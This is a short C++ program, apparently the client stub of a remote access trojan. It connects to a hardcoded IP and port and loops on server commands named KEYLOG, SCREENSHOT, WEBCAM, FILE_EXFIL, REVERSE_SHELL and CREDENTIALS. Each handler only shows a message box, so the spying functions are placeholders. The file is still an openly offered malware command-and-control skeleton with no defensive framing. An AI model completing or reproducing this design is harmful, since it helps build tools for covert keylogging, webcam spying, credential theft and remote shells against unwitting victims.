#include "communication.cpp" // Giả sử bạn có file header này thay vì communication.cpp
#include <Windows.h>
#include <string>

int main() {
    Communication comm("172.30.111.161", 8080); // Server IP and port
    if (!comm.connectToServer()) {
        MessageBoxA(NULL, "Failed to connect to server!", "Error", MB_OK | MB_ICONERROR);
        return 1;
    } else {
        MessageBoxA(NULL, "Successfully connected to server!", "Success", MB_OK | MB_ICONINFORMATION);
    }

    while (true) {
        std::string command = comm.receiveCommand();
        if (command.empty()) {
            // Handle case where no command is received
            continue;
        }
        if (command == "KEYLOG") {
            MessageBoxA(NULL, "Received KEYLOG command", "Notification", MB_OK | MB_ICONINFORMATION);
        } else if (command == "SCREENSHOT") {
            MessageBoxA(NULL, "Received SCREENSHOT command", "Notification", MB_OK | MB_ICONINFORMATION);
        } else if (command == "WEBCAM") {
            MessageBoxA(NULL, "Received WEBCAM command", "Notification", MB_OK | MB_ICONINFORMATION);
        } else if (command.find("FILE_EXFIL") == 0) {
            MessageBoxA(NULL, "Received FILE_EXFIL command", "Notification", MB_OK | MB_ICONINFORMATION);
        } else if (command == "REVERSE_SHELL") {
            MessageBoxA(NULL, "Received REVERSE_SHELL command", "Notification", MB_OK | MB_ICONINFORMATION);
        } else if (command == "CREDENTIALS") {
            MessageBoxA(NULL, "Received CREDENTIALS command", "Notification", MB_OK | MB_ICONINFORMATION);
        } else if (command == "EXIT") {
            break;
        } else {
            MessageBoxA(NULL, ("Unknown command: " + command).c_str(), "Warning", MB_OK | MB_ICONWARNING);
        }
    }
    return 0;
}